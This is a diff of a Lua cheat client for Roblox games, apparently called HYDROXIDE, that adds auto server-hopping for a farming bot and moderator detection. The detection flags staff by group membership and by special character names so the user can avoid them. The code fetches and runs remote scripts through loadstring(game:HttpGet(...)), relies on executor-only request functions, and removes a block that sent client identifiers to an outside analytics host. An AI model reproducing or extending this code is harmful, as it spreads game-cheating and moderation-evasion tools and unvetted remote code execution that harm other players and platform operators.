+                    if lifespanValue and lifespanValue:IsA("IntValue") and jobId ~= currentJobId and not is_server_recent(jobId, history) then
+                        local playerCount = 0
+                        if playersValue and playersValue:IsA("StringValue") then
+                            local success, playerData = pcall(function()
+                                return httpService:JSONDecode(playersValue.Value)
+                            end)
+                            if success and playerData and type(playerData) == "table" then
+                                playerCount = #playerData
+                            end
+                        end
+
+                        if playerCount < 23 then
+                            local lifespan = lifespanValue.Value
+                            if lifespan > maxLifespan then
+                                maxLifespan = lifespan
+                                oldestServer = jobId
+                            end
+                        end
+                    end
+                end
+
+                return oldestServer
+            end
+
+            function utility:get_newest_server()
+                local currentJobId = game.JobId
+                local history = get_server_history()
+                local serverInfo = FindFirstChild(rps, "ServerInfo")
+                local httpService = Services.HttpService
+
+                if not serverInfo then
+                    warn("[!] ServerInfo not found")
+                    return nil
+                end
+
+                local newestServer = nil
+                local minLifespan = math.huge
+
+                for _, serverFolder in ipairs(serverInfo:GetChildren()) do
+                    local jobId = serverFolder.Name
+                    local lifespanValue = FindFirstChild(serverFolder, "Lifespan")
+                    local playersValue = FindFirstChild(serverFolder, "Players")
+
+                    if lifespanValue and lifespanValue:IsA("IntValue") and jobId ~= currentJobId and not is_server_recent(jobId, history) then
+                        local playerCount = 0
+                        if playersValue and playersValue:IsA("StringValue") then
+                            local success, playerData = pcall(function()
+                                return httpService:JSONDecode(playersValue.Value)
+                            end)
+                            if success and playerData and type(playerData) == "table" then
+                                playerCount = #playerData
+                            end
+                        end
+
+                        if playerCount < 23 then
+                            local lifespan = lifespanValue.Value
+                            if lifespan < minLifespan then
+                                minLifespan = lifespan
+                                newestServer = jobId
+                            end
+                        end
+                    end
+                end
+
+                return newestServer
+            end
         end
 
         function utility:Serverhop()
-            local httpService = game:GetService("HttpService")
+            local httpService = Services.HttpService
             local bot_started = mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true"
             if bot_started then
                 local current_count = 0
@@ -2400,11 +2736,45 @@ if game.PlaceId == 100010170789226 then
                 MyAccount = nil
             end
 
+            local function attemptTeleport(jobId, maxRetries)
+                maxRetries = maxRetries or 3
+                local retries = 0
+
+                while retries < maxRetries do
+                    teleport_failed = false
+                    teleport_fail_reason = ""
+
+                    join_server:FireServer(jobId)
+
+                    local timeout = tick() + 20
+                    while tick() < timeout and not teleport_failed do
+                        task.wait(0.1)
+                    end
+
+                    if not teleport_failed then
+                        print("[TELEPORT] Teleport appears successful, waiting for transition...")
+                        task.wait(5)
+                        return true
+                    else
+                        retries = retries + 1
+                        if retries < maxRetries then
+                            warn(string.format("[RETRY %d/%d] Teleport failed: %s - Trying another server...", retries, maxRetries, teleport_fail_reason))
+                            return false
+                        else
+                            warn(string.format("[MAX RETRIES] Failed to teleport after %d attempts", maxRetries))
+                            return false
+                        end
+                    end
+                end
+
+                return false
+            end
+
             local function unblockAll()
             	if MyAccount then
             		local success, response = pcall(function()
             			local req = http_request or request or syn.request
-            			return req({ -- syn.request
+            			return req({
             				Url = "http://localhost:7963//UnblockEveryone?Account="..plr.Name,
             				Method = "GET"
             			})
@@ -2438,20 +2808,291 @@ if game.PlaceId == 100010170789226 then
             	end
             end
 
-            if plrs:GetChildren()[2] then
-                local blockTarget = game:GetService("Players"):GetChildren()[2]
-                task.wait(0.05)
-                if blockTarget then
-                    blockPlayer(blockTarget)
+            local function joinServerWithMinPlayers(min_players)
+                local placeId = game.PlaceId
+                local ROBLOX_GAMES_API = "https://games.roblox.com/v1/games/%s/servers/0"
+                local url = string.format(ROBLOX_GAMES_API .. "?sortOrder=2&excludeFullGames=false&limit=100", placeId)
+
+                local success, response = pcall(function()
+                    local req = http_request or request or syn.request
+                    return req({
+                        Url = url,
+                        Method = "GET",
+                        Headers = {
+                            ["Accept"] = "application/json"
+                        }
+                    })
+                end)
+
+                if not success or not response or not response.Success or response.StatusCode ~= 200 then
+                    return nil
                 end
-                tps:Teleport(100010170789226)
-                task.wait(0.1)
-                utility:Unload(true)
+
+                local decode_success, data = pcall(function()
+                    return httpService:JSONDecode(response.Body)
+                end)
+
+                if not decode_success or not data or not data.data then
+                    return nil
+                end
+
+                local SERVER_HISTORY_KEY = "RecentServers_" .. game.PlaceId
+                local history = {}
+                pcall(function()
+                    local stored = mem:GetItem(SERVER_HISTORY_KEY)
+                    if stored then
+                        local decoded = httpService:JSONDecode(stored)
+                        if type(decoded) == "table" then
+                            history = decoded
+                        end
+                    end
+                end)
+
+                local valid_servers = {}
+                for _, server in ipairs(data.data) do
+                    local jobId = server.id
+                    local playerCount = server.playing or 0
+                    local maxPlayers = server.maxPlayers or 0
+
+                    local is_recent = false
+                    for _, recentJobId in ipairs(history) do
+                        if recentJobId == jobId then
+                            is_recent = true
+                            break
+                        end
+                    end
+
+                    if jobId ~= game.JobId and not is_recent and playerCount >= min_players and playerCount < maxPlayers then
+                        table.insert(valid_servers, jobId)
+                    end
+                end
+
+                if #valid_servers > 0 then
+                    local max_server_attempts = math.min(12, #valid_servers)
+                    for attempt = 1, max_server_attempts do
+                        local randomJobId = valid_servers[math.random(1, #valid_servers)]
+                        print(string.format("[API JOIN] Attempting server %d/%d: %s", attempt, max_server_attempts, randomJobId))
+
+                        if attemptTeleport(randomJobId, 3) then
+                            return true
+                        end
+
+                        for i, jobId in ipairs(valid_servers) do
+                            if jobId == randomJobId then
+                                table.remove(valid_servers, i)
+                                break
+                            end
+                        end
+                    end
+
+                    warn(string.format("[API JOIN] All %d server attempts failed", max_server_attempts))
+                    return nil
+                else
+                    return nil
+                end
+            end
+
+            local function joinRandomServer(blockTarget)
+                local min_player_count = 0
+                if mem:HasItem("botstarted") then
+                    if mem:HasItem("trinket_bot_settings") then
+                        local success, settings = pcall(function()
+                            return httpService:JSONDecode(mem:GetItem("trinket_bot_settings"))
+                        end)
+                        if success and settings then
+                            min_player_count = settings.min_player_count or 0
+                        end
+                    end
+                end
+
+                if min_player_count > 0 then
+                    local api_success = joinServerWithMinPlayers(min_player_count)
+                    if api_success then
+                        return
+                    end
+                end
+
+                local serverInfo = FindFirstChild(rps, "ServerInfo")
+                if serverInfo then
+                    local servers = serverInfo:GetChildren()
+                    if #servers > 0 then
+                        local SERVER_HISTORY_KEY = "RecentServers_" .. game.PlaceId
+                        local history = {}
+                        pcall(function()
+                            local stored = mem:GetItem(SERVER_HISTORY_KEY)
+                            if stored then
+                                local decoded = httpService:JSONDecode(stored)
+                                if type(decoded) == "table" then
+                                    history = decoded
+                                end
+                            end
+                        end)
+
+                        local available_servers = {}
+                        for _, server in ipairs(servers) do
+                            local jobId = server.Name
+                            local is_recent = false
+
+                            for _, recentJobId in ipairs(history) do
+                                if recentJobId == jobId then
+                                    is_recent = true
+                                    break
+                                end
+                            end
+
+                            if jobId ~= game.JobId and not is_recent then
+                                local playersValue = FindFirstChild(server, "Players")
+                                if playersValue and playersValue:IsA("StringValue") then
+                                    local success, playerData = pcall(function()
+                                        return httpService:JSONDecode(playersValue.Value)
+                                    end)
+                                    if success and playerData and type(playerData) == "table" then
+                                        local playerCount = #playerData
+                                        if playerCount < 23 and playerCount >= min_player_count then
+                                            table.insert(available_servers, server)
+                                        end
+                                    end
+                                end
+                            end
+                        end
+
+                        if #available_servers > 0 then
+                            if min_player_count > 0 then
+                                print(string.format("Found %d non-full servers with %d+ players. Trying up to 12...", #available_servers, min_player_count))
+                            else
+                                print(string.format("Found %d non-full servers. Trying up to 12...", #available_servers))
+                            end
+
+                            local max_attempts = math.min(12, #available_servers)
+                            for attempt = 1, max_attempts do
+                                local randomServer = available_servers[math.random(1, #available_servers)]
+                                local jobId = randomServer.Name
+
+                                print(string.format("[SERVERHOP] Attempt %d/%d: Trying server %s", attempt, max_attempts, jobId))
+
+                                if attemptTeleport(jobId, 3) then
+                                    return
+                                end
+
+                                for i, server in ipairs(available_servers) do
+                                    if server.Name == jobId then
+                                        table.remove(available_servers, i)
+                                        break
+                                    end
+                                end
+                            end
+
+                            warn(string.format("[SERVERHOP] All %d server attempts failed, trying fallback", max_attempts))
+                        else
+                            warn("[SERVERHOP] No available servers found after filtering")
+                        end
+
+                        warn("[SERVERHOP] Clearing server history and trying any non-full server...")
+                        if utility then
+                            utility:clear_server_history()
+                        end
+
+                        local fallback_servers = {}
+                        for _, server in ipairs(servers) do
+                            local jobId = server.Name
+                            if jobId ~= game.JobId then
+                                local playersValue = FindFirstChild(server, "Players")
+                                if playersValue and playersValue:IsA("StringValue") then
+                                    local success, playerData = pcall(function()
+                                        return httpService:JSONDecode(playersValue.Value)
+                                    end)
+                                    if success and playerData and type(playerData) == "table" then
+                                        local playerCount = #playerData
+                                        if playerCount < 23 then
+                                            table.insert(fallback_servers, server)
+                                        end
+                                    end
+                                end
+                            end
+                        end
+
+                        if #fallback_servers > 0 then
+                            local max_fallback_attempts = math.min(12, #fallback_servers)
+                            for attempt = 1, max_fallback_attempts do
+                                local randomServer = fallback_servers[math.random(1, #fallback_servers)]
+                                local jobId = randomServer.Name
+
+                                print(string.format("[SERVERHOP FALLBACK] Attempt %d/%d: Trying server %s", attempt, max_fallback_attempts, jobId))
+
+                                if attemptTeleport(jobId, 3) then
+                                    return
+                                end
+
+                                for i, server in ipairs(fallback_servers) do
+                                    if server.Name == jobId then
+                                        table.remove(fallback_servers, i)
+                                        break
+                                    end
+                                end
+                            end
+
+                            warn(string.format("[SERVERHOP FALLBACK] All %d fallback attempts failed", max_fallback_attempts))
+                        else
+                            warn("[SERVERHOP FALLBACK] No non-full servers available at all")
+                        end
+
+                        utility:plain_webhook("@here SERVERHOP FAILED: All servers full or unavailable after 24 attempts. Kicking bot. if this happens dm zyu")
+                        task.wait(0.5)
+                        plr:Kick("Serverhop failed, dm zyu if this occurs [1]")
+                    else
+                        warn("[!] No servers found in ServerInfo, using fallback")
+                        if blockTarget then
+                            blockPlayer(blockTarget)
+                        end
+                        tps:Teleport(3016661674)
+                        task.wait(0.1)
+                        utility:Unload(true)
+                    end
+                else
+                    warn("[!] ServerInfo not found, using fallback teleport")
+                    if blockTarget then
+                        blockPlayer(blockTarget)
+                    end
+                    tps:Teleport(3016661674)
+                    task.wait(0.1)
+                    utility:Unload(true)
+                end
+            end
+
+            local join_oldest = false
+            if mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true" then
+                if mem:HasItem("trinket_bot_settings") then
+                    local success, settings = pcall(function()
+                        return httpService:JSONDecode(mem:GetItem("trinket_bot_settings"))
+                    end)
+                    if success and settings then
+                        join_oldest = settings.join_oldest_server or false
+                    end
+                end
+            end
+
+            if join_oldest then
+                local oldest_server_id = utility:get_oldest_server()
+                if oldest_server_id then
+                    utility:add_server_to_history(oldest_server_id)
+                    print(string.format("[JOIN OLDEST] Joining oldest server: %s", oldest_server_id))
+                    if attemptTeleport(oldest_server_id, 3) then
+                        return true
+                    else
+                        warn("[JOIN OLDEST] Failed to join oldest server, using random")
+                    end
+                else
+                    warn("[JOIN OLDEST] Failed to find oldest server, using random")
+                end
+            end
+
+            if plrs:GetChildren()[2] then
+                local blockTarget = Services.Players:GetChildren()[2]
+                task.wait(0.05)
+                joinRandomServer(blockTarget)
             else
                 task.wait(0.05)
-                tps:Teleport(100010170789226)
-                task.wait(0.1)
-                utility:Unload(true)
+                joinRandomServer()
             end
 
             return false
@@ -2479,87 +3120,21 @@ if game.PlaceId == 100010170789226 then
         end
     end
     
-    local repo = tostring(getgenv and getgenv().HYDROXIDE_REPO or "https://raw.githubusercontent.com/Ludirus/Hydroxide-Rogue-Additions/main/")
-    if repo:sub(-1) ~= "/" then
-        repo = repo .. "/"
-    end
-    shared.hydroxide_repo = repo
-    local function url_encode_repo_path(path)
-        return tostring(path):gsub("([^%w%-%._~/])", function(char)
-            return string.format("%%%02X", string.byte(char))
-        end)
-    end
-    local function resolve_repo_file_url(repo_url, path)
-        path = tostring(path or "loader.lua")
-        if path:find("^http://") or path:find("^https://") then
-            return path
-        end
-        return repo_url .. url_encode_repo_path(path)
-    end
-    local function cache_bust_url(url)
-        url = tostring(url or "")
-        if url == "" then
-            return url
-        end
-
-        local sep = url:find("?", 1, true) and "&" or "?"
-        return url .. sep .. "hxd_t=" .. tostring(os.time())
-    end
-    local function get_queued_loader_script()
-        local repo_url = tostring(getgenv and getgenv().HYDROXIDE_REPO or shared.hydroxide_repo or repo)
-        if repo_url:sub(-1) ~= "/" then
-            repo_url = repo_url .. "/"
-        end
-        shared.hydroxide_repo = repo_url
-        local entrypoint = getgenv and getgenv().HYDROXIDE_ENTRYPOINT
-        local has_entrypoint = entrypoint ~= nil and tostring(entrypoint) ~= ""
-        local loader_url = resolve_repo_file_url(repo_url, has_entrypoint and entrypoint or "loader.lua")
-        local function lua_string_literal(value)
-            return '"' .. tostring(value)
-                :gsub("\\", "\\\\")
-                :gsub('"', '\\"')
-                :gsub("\r", "\\r")
-                :gsub("\n", "\\n") .. '"'
-        end
-        local entrypoint_assignment = has_entrypoint and (" getgenv().HYDROXIDE_ENTRYPOINT=" .. lua_string_literal(entrypoint)) or " getgenv().HYDROXIDE_ENTRYPOINT=nil"
-        local queue_debug_setup = [[ local hxd_debug=false pcall(function() local lp=game:GetService("Players").LocalPlayer if lp and lp.Name==]] .. lua_string_literal(HYDROXIDE_DEBUG_USER) .. [[ then hxd_debug=true if getgenv then getgenv().HYDROXIDE_DEBUG=true end elseif getgenv and getgenv().HYDROXIDE_DEBUG~=nil then hxd_debug=getgenv().HYDROXIDE_DEBUG==true elseif getgenv then getgenv().HYDROXIDE_DEBUG=false end end) ]]
-        return [[if getgenv then getgenv().HYDROXIDE_REPO=]] .. lua_string_literal(repo_url) .. entrypoint_assignment .. [[ end if not game:IsLoaded() then game.Loaded:Wait() end task.wait(1)]] .. queue_debug_setup .. [[local s,code=pcall(function() return game:HttpGet(]] .. lua_string_literal(loader_url) .. [[,true) end) if not s then if hxd_debug then print("[QUEUE ERROR] HttpGet failed:",code) end return end local fn,compileErr=loadstring(code) if not fn then if hxd_debug then print("[QUEUE ERROR] Compile failed:",compileErr) print("[QUEUE DEBUG] Response preview:",tostring(code):sub(1,200)) end return end local ok,runErr=pcall(fn) if not ok and hxd_debug then print("[QUEUE ERROR] Runtime failed:",runErr) print("[QUEUE DEBUG] Traceback:",debug.traceback()) end]]
-    end
-    --[[
+    local repo = "https://raw.githubusercontent.com/heisenburgah/HYDROXIDE/refs/heads/main/"
     local success, library_func = pcall(function()
-        return loadstring(readfile("Library.txt"))()
-    end)
-    --]]
-    local success, library_func = pcall(function()
-        set_hydroxide_load_stage("battlegrounds_ui_library_fetch", repo)
-        return loadstring(game:HttpGet(cache_bust_url(repo .. "DEPENDENCIES/Library.lua"), true))()
+        return loadstring(game:HttpGet(repo .. "DEPENDENCIES/Library.lua", true))()
     end)
 
     if success then
-        local library_ok, library_or_err = pcall(library_func, shared, utility)
-        if not library_ok then
-            fatal_load("battlegrounds_ui_library_init_error", "[HYDROXIDE] Failed to initialize UI library: " .. tostring(library_or_err))
-        end
-
-        library = library_or_err
+        library = library_func(shared, utility)
         shared.library = library
 
         getgenv().Toggles = library.Toggles or {}
         getgenv().Options = library.Options or {}
         getgenv().Labels = library.Labels or {}
 
-        local save_ok, SaveManager = pcall(function()
-            return loadstring(game:HttpGet(cache_bust_url(repo .. "DEPENDENCIES/SaveManager.lua"), true))()
-        end)
-        local theme_ok, ThemeManager = pcall(function()
-            return loadstring(game:HttpGet(cache_bust_url(repo .. "DEPENDENCIES/ThemeManager.lua"), true))()
-        end)
-        if not save_ok or not theme_ok then
-            fatal_load(
-                "battlegrounds_ui_managers_error",
-                "[HYDROXIDE] Failed to load SaveManager/ThemeManager: " .. tostring(SaveManager) .. " | " .. tostring(ThemeManager)
-            )
-        end
+        local SaveManager = loadstring(game:HttpGet(repo .. "DEPENDENCIES/SaveManager.lua"))()
+        local ThemeManager = loadstring(game:HttpGet(repo .. "DEPENDENCIES/ThemeManager.lua"))()
 
         SaveManager:SetLibrary(library)
         ThemeManager:SetLibrary(library)
@@ -2567,57 +3142,74 @@ if game.PlaceId == 100010170789226 then
 
         shared.SaveManager = SaveManager
         shared.ThemeManager = ThemeManager
-        set_hydroxide_load_stage("battlegrounds_ui_library_ready")
     else
-        fatal_load("battlegrounds_ui_library_error", "[HYDROXIDE] Failed to load UI library: " .. tostring(library_func))
+        print("Failed to load UI library: " .. tostring(library_func))
     end
 
-    do -- Analytics (only sent to Hydroxide developers — baba & boss)
-        pcall(function()
-            local function transform(id)
-                local pepper = "HW_"
-                local mixed = pepper .. id .. pepper
-                local final = ""
+    
+    do
+        local player_races = {}
+        local race_colors = {}
 
-                for i = 1, #mixed do
-                    local val = string.byte(mixed, i)
-                    final = final .. string.format("%02X", (val * 13 + i * 5) % 256)
+        do
+            if(FindFirstChild(rps, 'Info') and FindFirstChild(rps.Info, 'Races')) then
+                for i, v in next, rps.Info.Races:GetChildren() do
+                    race_colors[#race_colors + 1] = {tostring(v.EyeColor.Value), tostring(v.SkinColor.Value), v.Name}
                 end
+            end
+        end
 
-                if #final < 56 then
-                    final = final .. string.rep("0", 56 - #final)
-                end
+        utility:Connection(plrs.PlayerRemoving, function(player)
+            player_races[player] = nil
+        end)
 
-                return final:sub(1, 56)
+        function cheat_client:get_race(player)
+            if(player_races[player] and tick() - player_races[player].lastUpdateAt <= 5) then
+                return player_races[player].name;
             end
 
-            local client_id = cloneref(game:GetService("RbxAnalyticsService")):GetClientId()
-            local token = transform(client_id)
+            local head = player.Character and FindFirstChild(player.Character, 'Head')
+            local face = head and FindFirstChild(head, 'RLFace')
+            local scroomHead = player.Character and FindFirstChild(player.Character, 'ScroomHead')
 
-            local req = http_request or request
-            pcall(req, {
-                Url = "https://api.heroinhound.cc/v1/analytics",
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json",
-                },
-                Body = httt:JSONEncode({
-                    uuid = token,
-                    executor = identifyexecutor and identifyexecutor() or "Unknown",
-                    place_id = game.PlaceId,
-                }),
-            })
-        end)
-    end
+            local raceFound = 'Unknown'
 
-    do
-        do -- Name retrieval
+            if(not face) then return raceFound end
+
+            if(scroomHead) then
+                if(scroomHead.Material.Name == 'DiamondPlate') then
+                    raceFound = 'Metascroom'
+                else
+                    raceFound = 'Scroom'
+                end
+            end
+
+            if(raceFound == 'Unknown') then
+                for i2, v2 in next, race_colors do
+                    local eyeColor, skinColor, raceName = v2[1], v2[2], v2[3];
+
+                    if(tostring(head.Color) == skinColor and tostring(face.Color3) == eyeColor) then
+                        raceFound = raceName
+                    end
+                end
+            end
+
+
+            player_races[player] = {
+                lastUpdateAt = tick(),
+                name = raceFound
+            }
+
+            return raceFound
+        end
+
+        do
             local function is_empty(s)
                 return s == nil or s == ""
             end
 
             function cheat_client:get_name(player)
-                if game.PlaceId == 100010170789226 then
+                if game.PlaceId == 5208655184 or game.PlaceId == 109732117428502 then
                     if not player:GetAttribute("FirstName") or player:GetAttribute("FirstName") == "" then
                         return "nil"
                     end
@@ -2636,6 +3228,28 @@ if game.PlaceId == 100010170789226 then
                     else
                         return fullName
                     end
+                elseif game.PlaceId == 3541987450 or game.PlaceId == 14341521240 then
+                    local leaderstats = FindFirstChild(player, "leaderstats")
+                    if not leaderstats or not FindFirstChild(leaderstats, "FirstName") then
+                        return "nil"
+                    end
+
+                    local firstName = leaderstats.FirstName.Value
+                    local lastName = leaderstats.LastName.Value
+                    local uberTitle = FindFirstChild(leaderstats, "UberTitle") and leaderstats.UberTitle.Value or ""
+
+                    local fullName = firstName
+                    if lastName and lastName ~= "" then
+                        fullName = firstName .. " " .. lastName
+                    end
+
+                    if not is_empty(uberTitle) then
+                        return fullName .. ", " .. uberTitle
+                    else
+                        return fullName
+                    end
+                else
+                    return "nil"
                 end
             end
         end
@@ -2649,13 +3263,30 @@ if game.PlaceId == 100010170789226 then
             local auto_housemate_ally = Toggles and Toggles.auto_housemate_ally and Toggles.auto_housemate_ally.Value or false
             local auto_friend_ally = Toggles and Toggles.auto_friend_ally and Toggles.auto_friend_ally.Value or false
 
-            if game.PlaceId == 100010170789226 then
+            if game.PlaceId == 5208655184 then
                 local lastName1 = player:GetAttribute("LastName")
                 local lastName2 = plr:GetAttribute("LastName")
 
                 local is_housemate = lastName1 and lastName1 ~= "" and lastName1 == lastName2
                 local is_friend = plr:IsFriendsWith(player.UserId)
                 local is_manual_friend = cheat_client and cheat_client.friends and table.find(cheat_client.friends, player.UserId) ~= nil
+
+                return (auto_housemate_ally and is_housemate) or
+                       (auto_friend_ally and is_friend) or
+                       is_manual_friend
+
+            elseif game.PlaceId == 3541987450 or game.PlaceId == 14341521240 then
+                local stats1 = FindFirstChild(player, "leaderstats")
+                local stats2 = FindFirstChild(plr, "leaderstats")
+
+                if not stats1 or not stats2 then return false end
+
+                local lastName1 = FindFirstChild(stats1, "LastName")
+                local lastName2 = FindFirstChild(stats2, "LastName")
+
+                local is_housemate = lastName1 and lastName2 and lastName1.Value == lastName2.Value
+                local is_friend = plr:IsFriendsWith(player.UserId)
+                local is_manual_friend = table.find(cheat_client.friends, player.UserId) ~= nil
 
                 return (auto_housemate_ally and is_housemate) or
                        (auto_friend_ally and is_friend) or
@@ -2669,7 +3300,6 @@ if game.PlaceId == 100010170789226 then
         end)
         
 
-        -- utility:sound("rbxassetid://1693890393",2)
         function utility:sound(Id, Removal)
             if cheat_client and shared and Toggles and Toggles.notifications and Toggles.notifications.Value then
                 local volume = cheat_client.config.notification_volume or 5
@@ -2684,22 +3314,170 @@ if game.PlaceId == 100010170789226 then
             end
         end
         
-        do -- mod detection
+        do
+            local valid_names = {}
+            local lich_names = {}
+
+            local function load_name_lists()
+                local success, nameGenerator = pcall(function()
+                    return rps.Info.NameGenerator
+                end)
+
+                if success and nameGenerator then
+                    local name_modules = {"Azael", "Cameo", "Kasparan", "Feminine", "LesserNavaran", "Lich", "Masculine", "Navaran", "Scroom", "Vind"}
+
+                    for _, module_name in ipairs(name_modules) do
+                        local name_module = FindFirstChild(nameGenerator, module_name)
+                        if name_module then
+                            local ok, names = pcall(function()
+                                return require(name_module)
+                            end)
+
+                            if ok and names then
+                                if module_name == "Lich" then
+                                    for _, name in ipairs(names) do
+                                        lich_names[name] = true
+                                        valid_names[name] = true
+                                    end
+                                else
+                                    for _, name in ipairs(names) do
+                                        valid_names[name] = true
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+
+            task.spawn(load_name_lists)
             function cheat_client:detect_mod(player)
                 if not player or player == plr then return end
 
                 local success, isInGroup, success2, isInGroup2
-                success, isInGroup = pcall(function()
-                    return player:IsInGroup(16473618)
-                end)
+
+                if game.PlaceId == 14341521240 then
+                    local success_mod, isInGroupMod = pcall(function()
+                        return player:IsInGroup(15055389)
+                    end)
+
+                    if success_mod and isInGroupMod then
+                        local player_rank = player:GetRoleInGroup(15055389)
+                        if player_rank ~= "Guest" and (library ~= nil and library.Notify) then
+                            utility:sound("rbxassetid://1693890393",4)
+                            library:Notify({
+                                Title = "🛑 MODERATOR DETECTED",
+                                Description = player.Name.." is a Moderator",
+                                Time = 25
+                            })
+                        end
+                    end
+                    return
+                else
+                    success, isInGroup = pcall(function()
+                        return player:IsInGroup(4556484)
+                    end)
+
+                    success2, isInGroup2 = pcall(function()
+                        return player:IsInGroup(281365)
+                    end)
+                end
+
+                local has_spec_name = false
+                local is_lich_mod = false
+                local firstName = player:GetAttribute("FirstName")
+
+                if firstName == nil or firstName == 'nil' then
+                    task.spawn(function()
+                        repeat
+                            task.wait(0.1)
+                            firstName = player:GetAttribute("FirstName")
+                        until (firstName ~= nil and firstName ~= 'nil') or not player.Parent
+
+                        if not player.Parent then return end
+
+                        if firstName == "Faceless One" or firstName == "Fungless One" then
+                            return
+                        end
+
+                        if firstName and firstName ~= "" then
+                            if lich_names[firstName] then
+                                is_lich_mod = true
+                            elseif not valid_names[firstName] then
+                                has_spec_name = true
+                            end
+                        end
+
+                        if is_lich_mod then
+                            if (library ~= nil and library.Notify) then
+                                utility:sound("rbxassetid://1693890393",4)
+                                library:Notify({
+                                    Title = "🛑 MODERATOR DETECTED",
+                                    Description = cheat_client:get_name(player).." ["..player.Name.."] has Lich name ["..firstName.."]",
+                                    Time = 25
+                                })
+                            end
+                        elseif has_spec_name then
+                            if (library ~= nil and library.Notify) then
+                                utility:sound("rbxassetid://2865227039",4)
+                                library:Notify({
+                                    Title = "⚠️ WARNING",
+                                    Description = cheat_client:get_name(player).." ["..player.Name.."] has a special name '"..firstName.."'",
+                                    Time = 25
+                                })
+                            end
+                        end
+                    end)
+                    firstName = nil
+                end
+
+                if firstName == "Faceless One" or firstName == "Fungless One" then
+                    return
+                end
+
+                if firstName and firstName ~= "" then
+                    if lich_names[firstName] then
+                        is_lich_mod = true
+                    elseif not valid_names[firstName] then
+                        has_spec_name = true
+                    end
+                end
 
                 if success and isInGroup then
-                    local player_rank = player:GetRoleInGroup(16473618)
-                    if player_rank ~= "Guest" and player_rank ~= "Member" and (library ~= nil and library.Notify) then
+                    local player_rank = player:GetRoleInGroup(4556484)
+                    if player_rank ~= "Guest" and (library ~= nil and library.Notify) then
                         utility:sound("rbxassetid://1693890393",4)
                         library:Notify({
                             Title = "🛑 MODERATOR DETECTED",
                             Description = cheat_client:get_name(player).." ["..player.Name.."] is in Rogue Lineage group, [ "..player_rank.." ]",
+                            Time = 25
+                        })
+                    end
+                elseif is_lich_mod then
+                    if (library ~= nil and library.Notify) then
+                        utility:sound("rbxassetid://1693890393",4)
+                        library:Notify({
+                            Title = "🛑 MODERATOR DETECTED",
+                            Description = cheat_client:get_name(player).." ["..player.Name.."] has Lich name ["..firstName.."]",
+                            Time = 25
+                        })
+                    end
+                elseif success2 and isInGroup2 then
+                    local player_rank = player:GetRoleInGroup(281365)
+                    if player_rank ~= "Guest" and (library ~= nil and library.Notify) then
+                        utility:sound("rbxassetid://2865227039",4)
+                        library:Notify({
+                            Title = "🛑 POSSIBLE MODERATOR",
+                            Description = cheat_client:get_name(player).." ["..player.Name.."] is in SPEC group (281365), [ "..player_rank.." ]",
+                            Time = 25
+                        })
+                    end
+                elseif has_spec_name then
+                    if (library ~= nil and library.Notify) then
+                        utility:sound("rbxassetid://2865227039",4)
+                        library:Notify({
+                            Title = "⚠️ WARNING",
+                            Description = cheat_client:get_name(player).." ["..player.Name.."] has a special name '"..firstName.."'",
                             Time = 25
                         })
                     end
@@ -2716,6 +3494,9 @@ if game.PlaceId == 100010170789226 then
                     if not success then
                         warn("IsInGroup failed for player: "..player.Name.." | Error: "..tostring(isInGroup))
                     end
+                    if not success2 then
+                        warn("IsInGroup (281365) failed for player: "..player.Name.." | Error: "..tostring(isInGroup2))
+                    end
                 end
             end
 
@@ -2726,10 +3507,10 @@ if game.PlaceId == 100010170789226 then
                 if not backpack then return end
 
                 local has_verdien = FindFirstChild(backpack, "Verdien")
+                local has_scroom_speech = FindFirstChild(backpack, "ScroomSpeech")
                 local has_life_sense = FindFirstChild(backpack, "Life Sense")
-                local has_floresco = FindFirstChild(backpack, "Floresco")
 
-                if has_verdien and not has_life_sense and not has_floresco then
+                if has_verdien and not has_scroom_speech and not has_life_sense then
                     if (library ~= nil and library.Notify) then
                         utility:sound("rbxassetid://2865227039",4)
                         library:Notify({
@@ -2778,7 +3559,7 @@ if game.PlaceId == 100010170789226 then
             end
         end
 
-        do -- reset
+        do
             function utility:reset()
                 local Character = plr.Character
                 
@@ -2796,12 +3577,24 @@ if game.PlaceId == 100010170789226 then
             end
         end
 
-        do -- game presence
+        do
             local ROBLOX_PRESENCE_API = "https://presence.roblox.com/v1/presence/users"
-            local httpService = game:GetService("HttpService")
+            local httpService = Services.HttpService
             local presenceCache = {}
-            local CACHE_DURATION = 30 -- seconds
-            
+            local CACHE_DURATION = 30
+
+            task.spawn(function()
+                while shared and not shared.is_unloading do
+                    task.wait(300)
+                    local now = tick()
+                    for userId, data in pairs(presenceCache) do
+                        if now - data.timestamp > CACHE_DURATION then
+                            presenceCache[userId] = nil
+                        end
+                    end
+                end
+            end)
+
             function utility:get_presence(userId)
                 local currentTime = tick()
                 local cachedData = presenceCache[userId]
@@ -2854,17 +3647,17 @@ if game.PlaceId == 100010170789226 then
             local server_name = ""
             local server_region = ""
             
-            if plr.PlayerGui and FindFirstChild(plr.PlayerGui, "Overlay") and FindFirstChild(plr.PlayerGui.Overlay, "TopBar") then
-                local server_stats = plr.PlayerGui.Overlay.TopBar.Frame
+            if plr.PlayerGui and FindFirstChild(plr.PlayerGui, "ServerStatsGui") and FindFirstChild(plr.PlayerGui.ServerStatsGui, "Frame") then
+                local server_stats = plr.PlayerGui.ServerStatsGui.Frame.Stats
                 if server_stats then
                     if FindFirstChild(server_stats, "ServerName") then
                         local full_text = server_stats.ServerName.Text
                         server_name = full_text:match("Server Name: (.+)") or ""
                     end
                     
-                    if FindFirstChild(server_stats, "ServerLocation") then
-                        local full_text = server_stats.ServerLocation.Text
-                        server_region = full_text:match("Server Location: (.+)") or ""
+                    if FindFirstChild(server_stats, "ServerRegion") then
+                        local full_text = server_stats.ServerRegion.Text
+                        server_region = full_text:match("Server Region: (.+)") or ""
                     end
                 end
             end
@@ -2872,9 +3665,9 @@ if game.PlaceId == 100010170789226 then
             return server_name, server_region
         end
 
-        do -- webhook
-            local HttpService = game:GetService("HttpService")
-            local Stats = game:GetService("Stats")
+        do
+            local HttpService = Services.HttpService
+            local Stats = Services.Stats
 
             local send_webhook = HXD_SEND_WEBHOOK
             local sanitize = HXD_SANITIZE
@@ -2893,14 +3686,14 @@ if game.PlaceId == 100010170789226 then
 
                 pcall(function()
                     send_webhook(cheat_client.config.webhook, {
-                        username = "bladee",
+                        username = cheat_client.config.webhook_username or "bladee",
                         content = content
                     })
                 end)
             end
 
             function utility:setup_error_webhook()
-                local ScriptContext = game:GetService("ScriptContext")
